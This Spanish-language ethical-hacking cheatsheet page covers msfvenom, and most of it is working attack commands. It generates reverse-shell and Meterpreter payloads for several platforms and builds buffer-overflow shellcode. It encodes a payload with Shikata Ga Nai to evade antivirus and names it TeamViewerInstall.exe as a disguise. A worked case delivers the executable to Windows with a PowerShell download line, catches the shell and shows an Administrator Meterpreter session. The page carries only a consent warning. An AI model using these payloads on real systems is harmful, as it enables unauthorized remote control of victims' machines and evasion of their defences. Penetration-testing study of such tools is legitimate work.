
# Msfvenom

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Listado de payloads disponibles</mark>

```bash
msfvenom -l payloads
```

## <mark style="color:purple;">Empleo</mark>

```bash
msfvenom -h
```

Utiliza el comando "msfvenom" para crear un payload personalizado. Por ejemplo, el siguiente comando crea un payload de reverse de shell de Windows:

{% code title="Sintaxis 1" overflow="wrap" %}

```python
# Para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_Address> LPORT=<Port> -f exe > payload.exe

# En Java
msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP_Address> LPORT=<Port> -f jar > payload.jar
```

{% endcode %}

<pre class="language-python" data-title="Sintaxis 2"><code class="lang-python"># En python
msfvenom -p python/meterpreter/reverse_tcp LHOST={nuestra_ip} LPORT=4444 -o troyano.py

# Para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST={nuestra_ip} LPORT=4444 -o troyano.exe

# Para Linux
<strong>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&#x3C;tu_IP> LPORT=&#x3C;puerto> -f elf > shell.elf
</strong></code></pre>

## <mark style="color:purple;">Buffer Overflow en Linux - Shellcode</mark>

```bash
msfvenom -p linux/x86/shell_reverse_tcp lhost={IP-ATACANTE} lport={PUERTO} --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
```

***

## <mark style="color:purple;">Evasión de Antivirus</mark>

### Codificación Shikata Ga Nai

Shikata Ga Nai es un encoder de Metasploit que se utiliza para ofuscar payloads, dificultando así su detección por sistemas antivirus. Este encoder emplea un algoritmo de codificación polimórfico, lo que significa que genera diferentes versiones del mismo payload en cada ejecución, evitando la generación de firmas estáticas. Aunque mejora las posibilidades de evadir antivirus, no garantiza la evasión completa debido a que los antivirus también evolucionan para detectar patrones de obfuscación.

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

{% hint style="info" %}
En sistemas Windows antiguos especificamos la arquitectura `x86` y en sistemas Windows modernos deberíamos especificar la arquitectura `x64`
{% endhint %}

***

## <mark style="color:purple;">MSF Build</mark>

También podemos automatizar este proceso con MSF Build, un script que he desarrollado en python que nos genera automáticamente el ejecutable con la codificación `Shikata Ga Nai` y otras medidas de evasión de antivirus.

{% embed url="<https://github.com/afsh4ck/MSF-Build/tree/main>" %}

***

## <mark style="color:purple;">Caso Práctico</mark>

### Meterpreter para Windows

{% code overflow="wrap" %}

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform windows -a x64 -n 200 -e generic/none -i 4 -f exe -o reverse_shell.exe
```

{% endcode %}

1. Enviar reverse\_shell.exe a la máquina Windows por el método que queramos:

{% code title="En Kali Linux" %}

```bash
cd <carpeta de la reverse shell>
python2 -m SimpleHTTPServer
# o
python3 -m http.server
```

{% endcode %}

{% code title="En Windows" %}

```powershell
(New-Object Net.WebClient).DownloadFile('http://{IP-ATACANTE}/reverse_shell.exe','reverse_shell.exe')
```

{% endcode %}

2. Nos ponemos en escucha con `Netcat` o `Metasploit/multi/handler` por el puerto asignado:

{% code title="Con Netcat" %}

```bash
nc -lvnp 4444
```

{% endcode %}

{% code title="Con Metasploit" %}

```bash
msfconsole
use exploit/multi/handler 
set LHOST 127.0.0.1
set LPORT 4444
set PAYLOAD python/meterpreter/reverse_tcp # o el que hayamos puesto en msfvenom
exploit
```

{% endcode %}

3. Ejecutar reverse\_shell.exe en la máquina Windows

```
. .\reverse_shell.exe
```

4. Recibimos la sesión de Meterpreter [😎](https://emojipedia.org/es/cara-sonriendo-con-gafas-de-sol/)

```
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending stage (177734 bytes) to 192.168.1.133
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 192.168.1.133:49402) at 2025-01-29 09:50:19 +0000

meterpreter > getuid
Server username: VAGRANT-2008R2\Administrator
```

***

## <mark style="color:purple;">Hack Tools Plugin</mark>

Este plugin disponible nos permite crear payloads a medida de MsfVenom, pudiendo configurar nuestra IP, puerto, plataforma objetivo, arquitectura y nuestro payload, en este caso un Meterpreter.<br>

{% embed url="<https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi?hl=es-419>" %}

<figure><img src="/files/YoiXxN8pZBJZJ6jimG4L" alt=""><figcaption><p>Hack Tools PLugin</p></figcaption></figure>

***

## <mark style="color:purple;">Links relacionados</mark>

{% content-ref url="/pages/O5p5YWoD0JklHB9mDMAb" %}
[Meterpreter](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/meterpreter.md)
{% endcontent-ref %}

{% content-ref url="/pages/8S7228bkDNukCB9ji4TT" %}
[Evasión de Antivirus](/ethical-hacking-cheatsheet/evasion-de-defensas/deteccion-y-evasion-de-defensas/evasion-de-antivirus.md)
{% endcontent-ref %}
